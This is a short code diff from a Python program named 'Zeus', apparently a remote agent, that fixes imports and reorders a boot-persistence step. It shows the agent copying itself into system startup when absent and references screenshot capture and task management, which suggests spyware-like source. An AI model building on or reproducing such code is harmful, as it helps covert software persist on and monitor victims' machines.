@@ -8,8 +8,8 @@ import urllib.request
 from threading import Thread
 
 # My imports
-from Handlers import BootPersistanceHandler
-from Handlers import TaskManagmentHandler
+from Handlers.BootPersistanceHandler import BootPersistanceHandler
+from Handlers.TaskManagmentHandler import TaskManagmentHandler
 
 configurations = {}
 
@@ -66,10 +66,11 @@ def takeScreenshot():
 if __name__ == "__main__":
     print("Starting Zeus...")
 
-    # Check if agents exists on device, if not - immidiatly copy itself to system boot/run
+    # Check if agents exists on device, if not - immediately copy itself to system boot/run
+    bootHandler = BootPersistanceHandler()
+
     isZeusExists = checkIfExists()
     if not isZeusExists:
-        bootHandler = BootPersistanceHandler()
         bootHandler.addSelfToSystemToBoot()
 
     didLoadConfSuccfully = loadConfigurations()
